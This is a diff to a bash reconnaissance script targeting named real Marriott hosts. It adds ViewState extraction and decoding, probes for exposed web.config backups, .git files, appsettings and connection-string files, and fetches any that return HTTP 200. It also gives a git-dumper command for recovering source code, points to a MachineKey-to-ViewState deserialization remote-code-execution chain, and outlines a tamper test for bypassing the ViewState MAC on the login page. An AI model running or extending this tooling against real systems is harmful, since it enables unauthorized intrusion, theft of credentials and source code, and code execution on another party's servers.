@@ -113,9 +113,9 @@ echo ""
 echo "--- 2A. Root page analysis ---"
 curl -sk -i "${BASE}/" | head -60
 echo ""
-echo "--- 2A2. Root page content mining ---"
+echo "--- 2A2. Root page content mining + ViewState extraction ---"
 curl -sk "${BASE}/" | python3 -c "
-import sys, re
+import sys, re, base64
 html = sys.stdin.read()
 forms   = re.findall(r'action=[\"\'](.*?)[\"\'`]', html, re.I)
 scripts = re.findall(r'src=[\"\'](.*?\.js[^\"\']*)[\"\'`]', html, re.I)
@@ -126,14 +126,56 @@ print('SCRIPTS:', scripts[:10])
 print('API_REFS:', sorted(set(apis))[:20])
 print('LINKS:', sorted(set(links))[:25])
 print('SIZE:', len(html))
+print()
+# ViewState analysis — critical for WebForms deserialization
+vs = re.findall(r'__VIEWSTATE[^>]*value=[\"\'](.*?)[\"\'`]', html, re.I)
+evs = re.findall(r'__EVENTVALIDATION[^>]*value=[\"\'](.*?)[\"\'`]', html, re.I)
+if vs:
+    print(f'VIEWSTATE_FOUND: yes (length={len(vs[0])})')
+    # Check if starts with 0x FF 0x 01 (BinaryFormatter) vs /w (JSON-based)
+    try:
+        decoded = base64.b64decode(vs[0][:64] + '==')
+        hex_start = decoded[:4].hex()
+        print(f'VIEWSTATE_HEX_START: {hex_start}')
+        if hex_start.startswith('ff01'):
+            print('VIEWSTATE_FORMAT: BinaryFormatter — MAC check is critical (ff01=LosFormatter)')
+        elif decoded[:2] == b'\\xff\\xd7':
+            print('VIEWSTATE_FORMAT: Encrypted ViewState (ff d7 = EncryptedViewState)')
+        else:
+            print(f'VIEWSTATE_FORMAT: Unknown — raw start: {decoded[:8]}')
+    except Exception as e:
+        print(f'VIEWSTATE_DECODE_ERR: {e}')
+    # MAC check: if value ends with HMAC (32 hex bytes), it is protected
+    print(f'VIEWSTATE_SAMPLE: {vs[0][:80]}...')
+else:
+    print('VIEWSTATE_FOUND: no — not a WebForms page (or JS-rendered)')
+if evs:
+    print(f'EVENTVALIDATION_FOUND: yes (length={len(evs[0])})')
 "
 
 echo ""
-echo "--- 2B. ASP.NET / IIS specific ---"
+echo "--- 2B. ASP.NET / IIS specific + backup files ---"
 for path in /elmah.axd /trace.axd /WebResource.axd /Glimpse.axd \
-            /web.config /web.config.bak /Web.config /.git/HEAD \
-            /app_offline.htm /packages.config /global.asax /Global.asax; do
+            /web.config /web.config.bak /Web.config.bak /Web.config \
+            /web.config.old /web.config~ /web.config.orig \
+            /.git/HEAD /.git/config /.git/COMMIT_EDITMSG \
+            /app_offline.htm /packages.config /global.asax /Global.asax \
+            /App_Data/ /bin/ /obj/ /backup/ /old/ \
+            /web.config.txt /connectionstrings.config \
+            /appsettings.json /appsettings.Development.json; do
   probe "${BASE}${path}"
+done
+
+echo ""
+echo "--- 2B2. Fetch any exposed config/backup files ---"
+for path in /web.config.bak /web.config.old /.git/HEAD \
+            /appsettings.json /connectionstrings.config; do
+  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 8 "${BASE}${path}")
+  if [ "$code" = "200" ]; then
+    echo "=== CRITICAL: ${BASE}${path} returned HTTP 200 ==="
+    fetch "${BASE}${path}"
+    echo "*** ACTION: If MachineKey found → ViewState deserialization RCE chain ***"
+  fi
 done
 
 echo ""
@@ -176,6 +218,28 @@ for id in 1 2 3 100 999; do
   code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 8 "${BASE}/api/v1/suppliers/${id}")
   echo "suppliers/$id → HTTP $code"
 done
+
+echo ""
+echo "--- 2H. .git source code exposure (if /.git/HEAD = 200) ---"
+git_head=$(curl -sk --max-time 8 "${BASE}/.git/HEAD")
+if echo "$git_head" | grep -q "ref:"; then
+  echo "=== CRITICAL: .git/HEAD exposed: $git_head ==="
+  echo "=== Downloading git objects for source code recovery ==="
+  curl -sk "${BASE}/.git/config" | head -30
+  curl -sk "${BASE}/.git/COMMIT_EDITMSG" | head -10
+  echo "*** To recover full source: use gitdumper.py or git-dumper from Pi ***"
+  echo "*** Command: git-dumper https://esupplier.marriott.com/.git ./esupplier-source ***"
+else
+  echo ".git/HEAD: not exposed (response: ${git_head:0:80})"
+fi
+
+echo ""
+echo "--- 2I. ViewState MAC bypass check (if ViewState found in 2A2) ---"
+echo "If VIEWSTATE_FOUND=yes from 2A2 AND no MAC suffix visible:"
+echo "Test sending request with tampered __VIEWSTATE to /Login.aspx:"
+echo "  Tamper: flip last byte of base64 ViewState value"
+echo "  If server returns 200 (not MAC validation error) → enableViewStateMac=false → deserialization possible"
+echo "This test is manual — do NOT automate payload sending, GET analysis only for now."
 
 # ==============================================================================
 # TARGET 3: eidhelp.marriott.com (M010 — Employee Identity, HIGH)
